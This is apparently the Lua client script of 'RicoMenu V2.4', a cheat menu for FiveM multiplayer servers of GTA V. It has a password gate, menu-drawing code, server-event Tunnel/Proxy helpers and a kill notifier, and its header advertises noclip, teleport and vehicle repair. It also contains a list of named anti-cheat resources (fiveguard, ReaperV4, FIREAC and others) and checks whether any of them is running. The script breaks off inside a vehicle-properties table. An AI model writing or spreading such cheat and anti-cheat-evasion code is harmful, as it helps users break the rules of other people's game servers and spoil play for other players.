-- UPDATED: 25/10/2024
-- RicoMenu V2.4 ON TOP
-- RicoMenu V2.4 ON TOP
-- RicoMenu V2.4 ON TOP
-- RicoMenu V2.4 ON TOP
-- RicoMenu V2.4 ON TOP
-- RicoMenu V2.4 ON TOP
-- RicoMenu V2.4 ON TOP
-- RicoMenu V2.4 ON TOP
-- RicoMenu V2.4 ON TOP
-- https://discord.gg/uZ89atD28m

local correctCodeEntered = false
local passwordNumbers = {114, 105, 99, 111, 109, 101, 110, 117}

function DisplayNotification(text)
    BeginTextCommandThefeedPost('STRING')
    AddTextComponentSubstringPlayerName(text)
    EndTextCommandThefeedPostTicker(true, true)
end

function ConvertPasswordToNumbers(input)
    local inputNumbers = {}
    for i = 1, #input do
        table.insert(inputNumbers, string.byte(input:sub(i, i)))
    end
    return inputNumbers
end

function ComparePasswords(inputNumbers, passwordNumbers)
    if #inputNumbers ~= #passwordNumbers then
        return false
    end
    for i = 1, #passwordNumbers do
        if inputNumbers[i] ~= passwordNumbers[i] then
            return false
        end
    end
    return true
end

function ShowPasswordEntryMenu()
    Citizen.CreateThread(function()
        AddTextEntry('FMMC_KEY_TIP1', '~w~Enter Password | @ricomodz')
        DisplayOnscreenKeyboard(1, 'FMMC_KEY_TIP1', '', '', '', '', '', 10)

        while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
            Citizen.Wait(0)
        end

        if UpdateOnscreenKeyboard() == 1 then
            local enteredCode = GetOnscreenKeyboardResult()
            if enteredCode then
                local enteredCodeNumbers = ConvertPasswordToNumbers(enteredCode)
                if ComparePasswords(enteredCodeNumbers, passwordNumbers) then
                    correctCodeEntered = true
                    DisplayNotification("Password accepted!")
                    Citizen.Wait(1000) 
                else
                    DisplayNotification("Invalid password. Please try again.")
                    Citizen.Wait(2000) 
                    ShowPasswordEntryMenu() 
                end
            end
        elseif UpdateOnscreenKeyboard() == 2 then
            DisplayNotification("Input cancelled.")
            Citizen.Wait(2000) 
            ShowPasswordEntryMenu() 
        end
    end)
end


function DisableAllControls()
    Citizen.CreateThread(function()
        while not correctCodeEntered do
            Citizen.Wait(0)
            
            DisableControlAction(0, 30, true) 
            DisableControlAction(0, 31, true) 
            DisableControlAction(0, 32, true) 
            DisableControlAction(0, 33, true) 
            
            DisableControlAction(0, 1, true) 
            DisableControlAction(0, 2, true) 
        
            DisableControlAction(0, 27, true) 
            DisableControlAction(0, 288, true) 
            DisableControlAction(0, 200, true) 
        end
    end)
end


function StartPasswordCheck()
    
    Citizen.CreateThread(function()
        ShowPasswordEntryMenu() 
        while not correctCodeEntered do
            Citizen.Wait(0) 
        end


RicoMenu = {} RicoMenu.debug = false local menus = {} local keys = {up = 172, down = 173, left = 174, right = 175, select = 191, back = 202} local optionCount = 0 local currentKey = nil local currentMenu = nil local titleHeight = 0.11 local titleXOffset = 0.5 local titleSpacing = 2 local titleYOffset = 0.03 local titleScale = 1.0 local buttonHeight = 0.038 local buttonFont = 0 local buttonScale = 0.365 local buttonTextXOffset = 0.005 local buttonTextYOffset = 0.005 local function debugPrint(text) if RicoMenu.debug then Citizen.Trace('[RicoMenu] ' .. tostring(text)) end end local function setMenuProperty(id, property, value) if id and menus[id] then menus[id][property] = value debugPrint(id .. ' menu property changed: { ' .. tostring(property) .. ', ' .. tostring(value) .. ' }') end end local function isMenuVisible(id) if id and menus[id] then return menus[id].visible else return false end end local function setMenuVisible(id, visible, holdCurrent) if id and menus[id] then setMenuProperty(id, 'visible', visible) if not holdCurrent and menus[id] then setMenuProperty(id, 'currentOption', 1) end if visible then if id ~= currentMenu and isMenuVisible(currentMenu) then setMenuVisible(currentMenu, false) end currentMenu = id end end end local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)SetTextColour(color.r, color.g, color.b, color.a)SetTextFont(font)SetTextScale(scale, scale) if shadow then SetTextDropShadow(2, 2, 0, 0, 0) end if menus[currentMenu] then if center then SetTextCentre(center) elseif alignRight then SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)SetTextRightJustify(true) end end BeginTextCommandDisplayText("STRING")AddTextComponentSubstringPlayerName(text)EndTextCommandDisplayText(x, y) end local function drawRect(x, y, width, height, color)DrawRect(x, y, width, height, color.r, color.g, color.b, color.a) end local function drawTitle() if menus[currentMenu] then local x = menus[currentMenu].x + menus[currentMenu].width / 2 local xText = menus[currentMenu].x + menus[currentMenu].width * titleXOffset local y = menus[currentMenu].y + titleHeight * 1 / titleSpacing if menus[currentMenu].titleBackgroundSprite then DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255) else drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor) end drawText(menus[currentMenu].title, xText, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true) end end local function drawSubTitle() if menus[currentMenu] then local x = menus[currentMenu].x + menus[currentMenu].width / 2 local y = menus[currentMenu].y + titleHeight + buttonHeight / 2 local subTitleColor = {r = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 255}drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false) if optionCount > menus[currentMenu].maxOptionCount then drawText(tostring(menus[currentMenu].currentOption) .. ' / ' .. tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true) end end end local function drawButton(text, subText) local x = menus[currentMenu].x + menus[currentMenu].width / 2 local multiplier = nil if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then multiplier = optionCount elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount) end if multiplier then local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2 local backgroundColor = nil local textColor = nil local subTextColor = nil local shadow = false if menus[currentMenu].currentOption == optionCount then backgroundColor = menus[currentMenu].menuFocusBackgroundColor textColor = menus[currentMenu].menuFocusTextColor subTextColor = menus[currentMenu].menuFocusTextColor else backgroundColor = menus[currentMenu].menuBackgroundColor textColor = menus[currentMenu].menuTextColor subTextColor = menus[currentMenu].menuSubTextColor shadow = true end drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) if subText then drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true) end end end function RicoMenu.CreateMenu(id, title)menus[id] = {}menus[id].title = title menus[id].subTitle = 'INTERACTION MENU' menus[id].visible = false menus[id].previousMenu = nil menus[id].aboutToBeClosed = false menus[id].x = 0.0175 menus[id].y = 0.025 menus[id].width = 0.23 menus[id].currentOption = 1 menus[id].maxOptionCount = 10 menus[id].titleFont = 1 menus[id].titleColor = {r = 0, g = 0, b = 0, a = 255}menus[id].titleBackgroundColor = {r = 245, g = 127, b = 23, a = 255}menus[id].titleBackgroundSprite = nil menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}menus[id].menuFocusTextColor = {r = 0, g = 0, b = 0, a = 255}menus[id].menuFocusBackgroundColor = {r = 245, g = 245, b = 245, a = 255}menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 160}menus[id].subTitleBackgroundColor = {r = menus[id].menuBackgroundColor.r, g = menus[id].menuBackgroundColor.g, b = menus[id].menuBackgroundColor.b, a = 255}menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}debugPrint(tostring(id) .. ' menu created') end function RicoMenu.CreateSubMenu(id, parent, subTitle) if menus[parent] then RicoMenu.CreateMenu(id, menus[parent].title) if subTitle then setMenuProperty(id, 'subTitle', string.upper(subTitle)) else setMenuProperty(id, 'subTitle', string.upper(menus[parent].subTitle)) end setMenuProperty(id, 'previousMenu', parent)setMenuProperty(id, 'x', menus[parent].x)setMenuProperty(id, 'y', menus[parent].y)setMenuProperty(id, 'maxOptionCount', menus[parent].maxOptionCount)setMenuProperty(id, 'titleFont', menus[parent].titleFont)setMenuProperty(id, 'titleColor', menus[parent].titleColor)setMenuProperty(id, 'titleBackgroundColor', menus[parent].titleBackgroundColor)setMenuProperty(id, 'titleBackgroundSprite', menus[parent].titleBackgroundSprite)setMenuProperty(id, 'menuTextColor', menus[parent].menuTextColor)setMenuProperty(id, 'menuSubTextColor', menus[parent].menuSubTextColor)setMenuProperty(id, 'menuFocusTextColor', menus[parent].menuFocusTextColor)setMenuProperty(id, 'menuFocusBackgroundColor', menus[parent].menuFocusBackgroundColor)setMenuProperty(id, 'menuBackgroundColor', menus[parent].menuBackgroundColor)setMenuProperty(id, 'subTitleBackgroundColor', menus[parent].subTitleBackgroundColor) else debugPrint('Failed to create ' .. tostring(id) .. ' submenu: ' .. tostring(parent) .. ' parent menu doesn\'t exist') end end function RicoMenu.CurrentMenu() return currentMenu end function RicoMenu.OpenMenu(id) if id and menus[id] then PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)setMenuVisible(id, true)debugPrint(tostring(id) .. ' menu opened') else debugPrint('Failed to open ' .. tostring(id) .. ' menu: it doesn\'t exist') end end function RicoMenu.IsMenuOpened(id) return isMenuVisible(id) end function RicoMenu.IsAnyMenuOpened() for id, _ in pairs(menus) do if isMenuVisible(id) then return true end end return false end function RicoMenu.IsMenuAboutToBeClosed() if menus[currentMenu] then return menus[currentMenu].aboutToBeClosed else return false end end function RicoMenu.CloseMenu() if menus[currentMenu] then if menus[currentMenu].aboutToBeClosed then menus[currentMenu].aboutToBeClosed = false setMenuVisible(currentMenu, false)debugPrint(tostring(currentMenu) .. ' menu closed')PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)optionCount = 0 currentMenu = nil currentKey = nil else menus[currentMenu].aboutToBeClosed = true debugPrint(tostring(currentMenu) .. ' menu about to be closed') end end end function RicoMenu.Button(text, subText) local buttonText = text if subText then buttonText = '{ ' .. tostring(buttonText) .. ', ' .. tostring(subText) .. ' }' end if menus[currentMenu] then optionCount = optionCount + 1 local isCurrent = menus[currentMenu].currentOption == optionCount drawButton(text, subText) if isCurrent then if currentKey == keys.select then PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)debugPrint(buttonText .. ' button pressed') return true elseif currentKey == keys.left or currentKey == keys.right then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) end end return false else debugPrint('Failed to create ' .. buttonText .. ' button: ' .. tostring(currentMenu) .. ' menu doesn\'t exist') return false end end function RicoMenu.MenuButton(text, id) if menus[id] then if RicoMenu.Button(text .. themecolor .. "   " .. themearrow) then setMenuVisible(currentMenu, false)setMenuVisible(id, true, true) return true end else debugPrint('Failed to create ' .. tostring(text) .. ' menu button: ' .. tostring(id) .. ' submenu doesn\'t exist') end return false end function RicoMenu.CheckBox(text, checked, offtext, ontext, callback) if not offtext then offtext = "Off" end if not ontext then ontext = "On" end if RicoMenu.Button(text, checked and ontext or offtext) then checked = not checked debugPrint(tostring(text) .. ' checkbox changed to ' .. tostring(checked)) if callback then callback(checked) end return true end return false end function RicoMenu.ComboBox(text, items, currentIndex, selectedIndex, callback) local itemsCount = #items local selectedItem = items[currentIndex] local isCurrent = menus[currentMenu].currentOption == (optionCount + 1) if itemsCount > 1 and isCurrent then selectedItem = tostring(selectedItem) end if RicoMenu.Button(text, selectedItem) then selectedIndex = currentIndex callback(currentIndex, selectedIndex) return true elseif isCurrent then if currentKey == keys.left then if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end elseif currentKey == keys.right then if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end end else currentIndex = selectedIndex end callback(currentIndex, selectedIndex) return false end function RicoMenu.Display() if isMenuVisible(currentMenu) then if menus[currentMenu].aboutToBeClosed then RicoMenu.CloseMenu() else ClearAllHelpMessages()drawTitle()drawSubTitle()currentKey = nil if IsDisabledControlJustReleased(1, keys.down) then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) if menus[currentMenu].currentOption < optionCount then menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1 else menus[currentMenu].currentOption = 1 end elseif IsDisabledControlJustReleased(1, keys.up) then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) if menus[currentMenu].currentOption > 1 then menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1 else menus[currentMenu].currentOption = optionCount end elseif IsDisabledControlJustReleased(1, keys.left) then currentKey = keys.left elseif IsDisabledControlJustReleased(1, keys.right) then currentKey = keys.right elseif IsDisabledControlJustReleased(1, keys.select) then currentKey = keys.select elseif IsDisabledControlJustReleased(1, keys.back) then if menus[menus[currentMenu].previousMenu] then PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)setMenuVisible(menus[currentMenu].previousMenu, true) else RicoMenu.CloseMenu() end end optionCount = 0 end end end function RicoMenu.SetMenuWidth(id, width)setMenuProperty(id, 'width', width) end function RicoMenu.SetMenuX(id, x)setMenuProperty(id, 'x', x) end function RicoMenu.SetMenuY(id, y)setMenuProperty(id, 'y', y) end function RicoMenu.SetMenuMaxOptionCountOnScreen(id, count)setMenuProperty(id, 'maxOptionCount', count) end function RicoMenu.SetTitle(id, title)setMenuProperty(id, 'title', title) end function RicoMenu.SetTitleColor(id, r, g, b, a)setMenuProperty(id, 'titleColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a}) end function RicoMenu.SetTitleBackgroundColor(id, r, g, b, a)setMenuProperty(id, 'titleBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a}) end function RicoMenu.SetTitleBackgroundSprite(id, textureDict, textureName)RequestStreamedTextureDict(textureDict)setMenuProperty(id, 'titleBackgroundSprite', {dict = textureDict, name = textureName}) end function RicoMenu.SetSubTitle(id, text)setMenuProperty(id, 'subTitle', string.upper(text)) end function RicoMenu.SetMenuBackgroundColor(id, r, g, b, a)setMenuProperty(id, 'menuBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a}) end function RicoMenu.SetMenuTextColor(id, r, g, b, a)setMenuProperty(id, 'menuTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a}) end function RicoMenu.SetMenuSubTextColor(id, r, g, b, a)setMenuProperty(id, 'menuSubTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a}) end function RicoMenu.SetMenuFocusColor(id, r, g, b, a)setMenuProperty(id, 'menuFocusColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a}) end function RicoMenu.SetMenuButtonPressedSound(id, name, set)setMenuProperty(id, 'buttonPressedSound', {['name'] = name, ['set'] = set}) end Tools = {} local IDGenerator = {} function Tools.newIDGenerator() local r = setmetatable({}, {__index = IDGenerator})r:construct() return r end function IDGenerator:construct()self:clear() end function IDGenerator:clear()self.max = 0 self.ids = {} end function IDGenerator:gen() if #self.ids > 0 then return table.remove(self.ids) else local r = self.max self.max = self.max + 1 return r end end function IDGenerator:free(id)table.insert(self.ids, id) end Tunnel = {} local function tunnel_resolve(itable, key) local mtable = getmetatable(itable) local iname = mtable.name local ids = mtable.tunnel_ids local callbacks = mtable.tunnel_callbacks local identifier = mtable.identifier local fcall = function(args, callback) if args == nil then args = {} end if type(callback) == "function" then local rid = ids:gen()callbacks[rid] = callback TriggerServerEvent(iname .. ":tunnel_req", key, args, identifier, rid) else TriggerServerEvent(iname .. ":tunnel_req", key, args, "", -1) end end itable[key] = fcall return fcall end function Tunnel.bindInterface(name, interface)RegisterNetEvent(name .. ":tunnel_req")AddEventHandler(name .. ":tunnel_req", function(member, args, identifier, rid) local f = interface[member] local delayed = false local rets = {} if type(f) == "function" then TUNNEL_DELAYED = function()delayed = true return function(rets)rets = rets or {} if rid >= 0 then TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets) end end end rets = {f(table.unpack(args))} end if not delayed and rid >= 0 then TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets) end end) end function Tunnel.getInterface(name, identifier) local ids = Tools.newIDGenerator() local callbacks = {} local r = setmetatable({}, {__index = tunnel_resolve, name = name, tunnel_ids = ids, tunnel_callbacks = callbacks, identifier = identifier})RegisterNetEvent(name .. ":" .. identifier .. ":tunnel_res")AddEventHandler(name .. ":" .. identifier .. ":tunnel_res", function(rid, args) local callback = callbacks[rid] if callback ~= nil then ids:free(rid)callbacks[rid] = nil callback(table.unpack(args)) end end) return r end Proxy = {} local proxy_rdata = {} local function proxy_callback(rvalues)proxy_rdata = rvalues end local function proxy_resolve(itable, key) local iname = getmetatable(itable).name local fcall = function(args, callback) if args == nil then args = {} end TriggerEvent(iname .. ":proxy", key, args, proxy_callback) return table.unpack(proxy_rdata) end itable[key] = fcall return fcall end function Proxy.addInterface(name, itable)AddEventHandler(name .. ":proxy", function(member, args, callback) local f = itable[member] if type(f) == "function" then callback({f(table.unpack(args))}) else end end) end function Proxy.getInterface(name) local r = setmetatable({}, {__index = proxy_resolve, name = name}) return r end

developers = {
    "RICO - @ricomodz",
}

menuName = ""
version = "" 
theme = "infamous"
themes = {"infamous", "basic", "dark", "skid"}
mpMessage = false
menuKeybind = "PAGEDOWN"	
menuKeybind2 = "F10"	
noclipKeybind = "K"		
teleportKeyblind = "F6"
fixvaiculoKeyblind = "F5"
startMessage = "~b~¦~s~WELCOME ~b~[ ~s~⏳ ~b~]~n~👤 LOGIN → ~b~[~s~ " ..GetPlayerName(PlayerId()).. " ~b~] ~w~∑"	
subMessage = "~n~~w~🔒 OPEN MENU"
subMessage1 = "🔑 ~b~[ ~s~"..menuKeybind.." ~b~]~s~ OR ~b~[ ~s~"..menuKeybind2.."~b~ ]"
motd2 = "~b~DISCORD: ~s~@ricomodz"
motd = "~h~SUPPORT: ~y~QB + ESX "
motd5 = "~o~Noclip [K] Teleport [F6] Fix Vehicle [F5]"

local lastKillerName = ""
local lastKillerWeapon = ""
local showMessage = false
local messageStartTime = 0

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(1000)

        if IsPedDeadOrDying(PlayerPedId(), 1) then
            if not showMessage then
                local killerPed = GetPedSourceOfDeath(PlayerPedId())
                local weaponHash = GetPedCauseOfDeath(PlayerPedId())

                if killerPed == PlayerPedId() then
                    lastKillerName = "~w~Yourself"
                    lastKillerWeapon = ""
                elseif killerPed == 0 then
                    lastKillerName = "~w~Natural Causes"
                    lastKillerWeapon = ""
                elseif IsEntityAVehicle(killerPed) then
                    lastKillerName = "~w~Vehicle"
                    lastKillerWeapon = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(killerPed)))
                else
                    if IsPedAPlayer(killerPed) then
                        lastKillerName = GetPlayerName(NetworkGetPlayerIndexFromPed(killerPed))
                    else
                        lastKillerName = "~w~NPC"
                    end

                    if weaponHash ~= 0 then
                        lastKillerWeapon = GetWeaponName(weaponHash)
                    else
                        lastKillerWeapon = "~w~Unknown Weapon"
                    end
                end

                
                SetNotificationTextEntry("STRING")
                if lastKillerWeapon ~= "" then
                    AddTextComponentString("~y~RICO SYSTEM: ~b~You were killed by " .. lastKillerName .. " using " .. lastKillerWeapon)
                else
                    AddTextComponentString("~y~RICO SYSTEM: ~b~You were killed by " .. lastKillerName)
                end
                DrawNotification(false, true)

                showMessage = true
                messageStartTime = GetGameTimer()
            end
        else
            
            if showMessage and (GetGameTimer() - messageStartTime) > 5000 then
                showMessage = false
            end
        end
    end
end)

function GetWeaponName(hash)
    local weapons = {
        [-1716189206] = "Knife",
        [-1569615261] = "Unarmed",
        [1317494643] = "Hammer",
        [-1786099057] = "Bat",
        [-1834847097] = "Crowbar",
        [1141786504] = "Golf Club",
        [-102323637] = "Bottle",
        [-1951375401] = "Dagger",
        [-1834847097] = "Hatchet",
        [-102973651] = "Knuckle Duster",
        [940833800] = "Machete",
        [453432689] = "Pistol",
        [3219281620] = "Pistol MK2",
        [1593441988] = "Combat Pistol",
        [-1716589765] = "Pistol .50",
        [-1076751822] = "SNS Pistol",
        [2009644972] = "SNS Pistol MK2",
        [-771403250] = "Heavy Pistol",
        [137902532] = "Vintage Pistol",
        [584646201] = "APPistol",
        [-598887786] = "Stun Gun",
        [940833800] = "Molotov",
        [911657153] = "Marksman Pistol",
        [1198879012] = "Revolver",
        [-1045183535] = "Revolver MK2",
        [-879347409] = "Double Action Revolver",
        [3249783761] = "Up-n-Atomizer",
        [324215364] = "Micro SMG",
        [736523883] = "SMG",
        [2024373456] = "SMG MK2",
        [-270015777] = "Assault SMG",
        [171789620] = "Combat PDW",
        [-619010992] = "Machine Pistol",
        [-1121678507] = "Mini SMG",
        [487013001] = "Pump Shotgun",
        [1432025498] = "Pump Shotgun MK2",
        [2017895192] = "Sawed-Off Shotgun",
        [-1654528753] = "Bullpup Shotgun",
        [-494615257] = "Assault Shotgun",
        [-1466123874] = "Musket",
        [984333226] = "Heavy Shotgun",
        [4019527611] = "Double Barrel Shotgun",
        [317205821] = "Sweeper Shotgun",
        [-1074790547] = "Assault Rifle",
        [961495388] = "Assault Rifle MK2",
        [-2084633992] = "Carbine Rifle",
        [4208062921] = "Carbine Rifle MK2",
        [-1357824103] = "Advanced Rifle",
        [-1063057011] = "Special Carbine",
        [2526821735] = "Special Carbine MK2",
        [-1768145561] = "Bullpup Rifle",
        [2228681469] = "Bullpup Rifle MK2",
        [-2066285827] = "Compact Rifle",
        [100416529] = "Sniper Rifle",
        [205991906] = "Heavy Sniper",
        [177293209] = "Heavy Sniper MK2",
        [-952879014] = "Marksman Rifle",
        [1785463520] = "Marksman Rifle MK2",
        [-1312131151] = "RPG",
        [-270015777] = "Grenade Launcher",
        [2138347493] = "Grenade Launcher Smoke",
        [1834241177] = "Minigun",
        [1672152130] = "Firework Launcher",
        [125959754] = "Railgun",
        [-1238556825] = "Homing Launcher",
        [-1813897027] = "Compact Grenade Launcher",
        [1305664598] = "Widowmaker",
        [600439132] = "Grenade",
        [741814745] = "Sticky Bomb",
        [615608432] = "Proximity Mine",
        [101631238] = "BZ Gas",
        [883325847] = "Molotov",
        [1233104067] = "Fire Extinguisher",
        [600914825] = "Petrol Can",
        [126349499] = "Flare",
        [-37975472] = "Ball",
        [-1813897027] = "Snowball",
        [1233104067] = "Smoke Grenade",
        [-1600701090] = "Pipe Bomb",
    }

    return weapons[hash] or "Unknown Weapon"
end

local checkInterval = 5000 
local antiCheatScripts = {
    "qb-anticheat", "venus_anticheat", "anticheese", "ReaperV4", "fiveguard",
    "FIREAC", "FuriousAntiCheat", "ReaperV3", "fg", "phoenix", "TitanAC",
    "VersusAC", "VersusAC-OCR", "waveshield", "anticheese-anticheat-master",
    "anticheese-anticheat", "wx-anticheat", "AntiCheese", "AntiCheese-master",
    "ReaperAC", "somis_anticheat", "somis-anticheat", "ClownGuard", "oltest",
    "ChocoHax", "ESXAC", "TigoAC", "VenusAC"
} 
local noAntiCheatMessageShown = false 

function DisplayNotification(message)
    SetNotificationTextEntry("STRING")
    AddTextComponentSubstringPlayerName(message)
    DrawNotification(false, true)
end

function DisplayColoredNotification()
    SetNotificationTextEntry("STRING")
    AddTextComponentSubstringPlayerName("~y~RICO SYSTEM: ~r~Warning ~w~This Server is Protected By ~o~Anti Cheat Script!")
    DrawNotification(false, true)
end

function CheckForAntiCheatScript()
    local antiCheatFound = false

    for _, script in ipairs(antiCheatScripts) do
        
        if GetResourceState(script) == "started" then
            antiCheatFound = true
            break
        end
    end

    if antiCheatFound and not noAntiCheatMessageShown then
        DisplayColoredNotification()
        noAntiCheatMessageShown = true
    elseif not antiCheatFound then
        noAntiCheatMessageShown = false
    end
end

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(checkInterval)
        CheckForAntiCheatScript()
    end
end)

FiveM = {}
do
    FiveM.Notify = function(text, type)
        if type == nil then type = NotificationType.None end
        SetNotificationTextEntry("STRING")
        if type == NotificationType.Info then
            AddTextComponentString("~b~~h~Info~h~~s~: " .. text)
        elseif type == NotificationType.Error then
            AddTextComponentString("~b~~h~Error~h~~s~: " .. text)
        elseif type == NotificationType.Alert then
            AddTextComponentString("~y~~h~Alert~h~~s~: " .. text)
        elseif type == NotificationType.Success then
            AddTextComponentString("~g~~h~Success~h~~s~: " .. text)
        else
            AddTextComponentString(text)
        end
        DrawNotification(false, false)
    end

    FiveM.Subtitle = function(message, duration, drawImmediately)
        if duration == nil then duration = 2500 end;
        if drawImmediately == nil then drawImmediately = true; end;
        ClearPrints()
        SetTextEntry_2("STRING");
        for i = 1, message:len(), 99 do
            AddTextComponentString(string.sub(message, i, i + 99))
        end
        DrawSubtitleTimed(duration, drawImmediately);
    end

    FiveM.GetKeyboardInput = function(TextEntry, ExampleText, MaxStringLength)
        AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
        DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
        local blockinput = true
        while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do Citizen.Wait(0) end

        if UpdateOnscreenKeyboard() ~= 2 then
            local result = GetOnscreenKeyboardResult()
            Citizen.Wait(500)
            blockinput = false
            return result
        else
            Citizen.Wait(500)
            blockinput = false
            return nil
        end
    end

    FiveM.GetVehicleProperties = function(vehicle)
        local color1, color2 = GetVehicleColours(vehicle)
        local pearlescentColor, wheelColor = GetVehicleExtraColours(vehicle)
        local extras = {}

        for id = 0, 12 do
            if DoesExtraExist(vehicle, id) then
                local state = IsVehicleExtraTurnedOn(vehicle, id) == 1
                extras[tostring(id)] = state
            end
        end

        return {
            model = GetEntityModel(vehicle),

            plate = math.trim(GetVehicleNumberPlateText(vehicle)),
            plateIndex = GetVehicleNumberPlateTextIndex(vehicle),

            health = GetEntityMaxHealth(vehicle),
            dirtLevel = GetVehicleDirtLevel(vehicle),

            color1 = color1,
            color2 = color2,

            pearlescentColor = pearlescentColor,
            wheelColor = wheelColor,

            wheels = GetVehicleWheelType(vehicle),
            windowTint = GetVehicleWindowTint(vehicle),

            neonEnabled = {
                IsVehicleNeonLightEnabled(vehicle, 0), IsVehicleNeonLightEnabled(vehicle, 1), IsVehicleNeonLightEnabled(vehicle, 2),
                IsVehicleNeonLightEnabled(vehicle, 3)
            },

            extras = extras,

            neonColor = table.pack(GetVehicleNeonLightsColour(vehicle)),
            tyreSmokeColor = table.pack(GetVehicleTyreSmokeColor(vehicle)),

            modSpoilers = GetVehicleMod(vehicle, 0),
            modFrontBumper = GetVehicleMod(vehicle, 1),
            modRearBumper = GetVehicleMod(vehicle, 2),
            modSideSkirt = GetVehicleMod(vehicle, 3),
            modExhaust = GetVehicleMod(vehicle, 4),
            modFrame = GetVehicleMod(vehicle, 5),
            modGrille = GetVehicleMod(vehicle, 6),
            modHood = GetVehicleMod(vehicle, 7),
            modFender = GetVehicleMod(vehicle, 8),
            modRightFender = GetVehicleMod(vehicle, 9),
            modRoof = GetVehicleMod(vehicle, 10),

            modEngine = GetVehicleMod(vehicle, 11),
            modBrakes = GetVehicleMod(vehicle, 12),
            modTransmission = GetVehicleMod(vehicle, 13),
            modHorns = GetVehicleMod(vehicle, 14),
            modSuspension = GetVehicleMod(vehicle, 15),
            modArmor = GetVehicleMod(vehicle, 16),

            modTurbo = IsToggleModOn(vehicle, 18),
            modSmokeEnabled = IsToggleModOn(vehicle, 20),
            modXenon = IsToggleModOn(vehicle, 22),

            modFrontWheels = GetVehicleMod(vehicle, 23),
            modBackWheels = GetVehicleMod(vehicle, 24),

            modPlateHolder = GetVehicleMod(vehicle, 25),
            modVanityPlate = GetVehicleMod(vehicle, 26),
            modTrimA = GetVehicleMod(vehicle, 27),
            modOrnaments = GetVehicleMod(vehicle, 28),
            modDashboard = GetVehicleMod(vehicle, 29),
            modDial = GetVehicleMod(vehicle, 30),
            modDoorSpeaker = GetVehicleMod(vehicle, 31),
            modSeats = GetVehicleMod(vehicle, 32),
            modSteeringWheel = GetVehicleMod(vehicle, 33),
            modShifterLeavers = GetVehicleMod(vehicle, 34),
            modAPlate = GetVehicleMod(vehicle, 35),
            modSpeakers = GetVehicleMod(vehicle, 36),
            modTrunk = GetVehicleMod(vehicle, 37),
            modHydrolic = GetVehicleMod(vehicle, 38),
            modEngineBlock = GetVehicleMod(vehicle, 39),
            modAirFilter = GetVehicleMod(vehicle, 40),
            modStruts = GetVehicleMod(vehicle, 41),
            modArchCover = GetVehicleMod(vehicle, 42),
            modAerials = GetVehicleMod(vehicle, 43),
            modTrimB = GetVehicleMod(vehicle, 44),
            modTank = GetVehicleMod(vehicle, 45),
